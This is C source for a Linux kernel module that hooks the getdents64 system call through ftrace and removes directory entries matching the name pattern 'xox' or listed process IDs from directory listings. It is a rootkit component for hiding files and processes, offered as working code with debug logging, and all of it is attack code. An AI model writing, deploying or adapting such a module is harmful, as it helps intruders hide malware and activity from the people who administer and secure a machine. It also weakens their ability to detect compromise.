#include "../include/ftrace.h"
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/dcache.h>
#include <linux/sched.h>
#include <linux/namei.h>
#include <linux/version.h>
#include <linux/dirent.h>

/*
 *                 CONFIGS
 */

static const char *hidden_patterns[] = {
    "xox",
    NULL
};

static const char *hidden_pids[] = {
    NULL
};

static bool is_hidden_pid(const char *name)
{ /* Check if is a hidden PID
*/
  int i;
    
  if (!name)
    return false;
        
  for (i = 0; name[i]; i++)
    {
      if (name[i] < '0' || name[i] > '9')
        return false;
    }
    
  for (i = 0; hidden_pids[i] != NULL; i++)
    {
      if (strcmp(name, hidden_pids[i]) == 0)
        return true;
    }
    
  return false;
}

static notrace bool should_hide_name(const char *name)
{ /* Determine if a name should be hidden
*/
  int i;

  if (!name)
    return false;

  for (i = 0; hidden_patterns[i] != NULL; i++)
    {
      if (strstr(name, hidden_patterns[i]))
        {
          printk(KERN_DEBUG "XoX <(Hiding: %s - matches pattern: %s)>\n", 
                 name, hidden_patterns[i]);
          return true;
        }
    }

  if (is_hidden_pid(name))
    {
      printk(KERN_DEBUG "XoX <(Hiding PID: %s)>\n", name);
      return true;
    }

  return false;
}

static int filter_dirents(void __user *dirent, int ret)
{ /* Filter directory entries
*/
  struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
  unsigned long offset = 0;
  int reclen;
  char *name;
  int new_ret = ret;

  printk(KERN_DEBUG "XoX <(filter_dirents: ret=%d, dirent=%p)>\n", ret, dirent);

  if (ret <= 0 || !dirent)
    return ret;

  dirent_ker = kzalloc(ret, GFP_KERNEL);
  if (!dirent_ker)
    {
      printk(KERN_DEBUG "XoX <(filter_dirents: allocation failed)>\n");
      return ret;
    }

  if (copy_from_user(dirent_ker, dirent, ret))
    {
      printk(KERN_DEBUG "XoX <(filter_dirents: copy_from_user failed)>\n");
      kfree(dirent_ker);
      return ret;
    }

  while (offset < ret)
    {
      current_dir = (struct linux_dirent64 *)((char *)dirent_ker + offset);
      reclen = current_dir->d_reclen;
        
      if (reclen <= 0 || reclen > (ret - offset))
        {
          printk(KERN_DEBUG "XoX <(filter_dirents: invalid reclen=%d)>\n", reclen);
          break;
        }
        
      name = current_dir->d_name;

      if (should_hide_name(name))
        {
          new_ret -= reclen;
          memmove(current_dir, (char *)current_dir + reclen, ret - offset - reclen);
          ret -= reclen;
          continue;
        }

      previous_dir = current_dir;
      offset += reclen;
    }

  if (copy_to_user(dirent, dirent_ker, new_ret))
    {
      printk(KERN_DEBUG "XoX <(filter_dirents: copy_to_user failed)>\n");
      kfree(dirent_ker);
      return ret;
    }

  kfree(dirent_ker);
    
  if (new_ret != ret)
    {
      printk(KERN_DEBUG "XoX <(filter_dirents: filtered %d -> %d bytes)>\n", 
             ret, new_ret);
    }
    
  return new_ret;
}

#ifdef PTREGS_SYSCALL_STUBS
  static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
#else
  static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
#endif


#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
  unsigned int fd = regs->di;
  struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
  unsigned int count = regs->dx;
#else
  static asmlinkage long hook_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count)
{
#endif
  long ret;

  ret = orig_getdents64(regs);
    
  if (ret > 0)
    ret = filter_dirents(dirent, ret);

  return ret;
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
};

static int __init getdents_init(void)
{
  int err;

  printk(KERN_INFO "XoX <(Initializing getdents64 hook)>\n");
    
  err = f_install_hooks(hooks, ARRAY_SIZE(hooks));
  if (err)
    {
      printk(KERN_ERR "XoX <(Failed to install hooks: %d)>\n", err);
      return err;
    }

  printk(KERN_INFO "XoX <(Getdents64 hook installed successfully)>\n");
  printk(KERN_INFO "XoX <(Hiding %zu patterns)>\n", 
         sizeof(hidden_patterns) / sizeof(hidden_patterns[0]) - 1);

  return 0;
}

static void __exit getdents_exit(void)
{
  f_remove_hooks(hooks, ARRAY_SIZE(hooks));
  printk(KERN_INFO "XoX <(Getdents64 hook removed)>\n");
}

module_init(getdents_init);
module_exit(getdents_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("XoX");
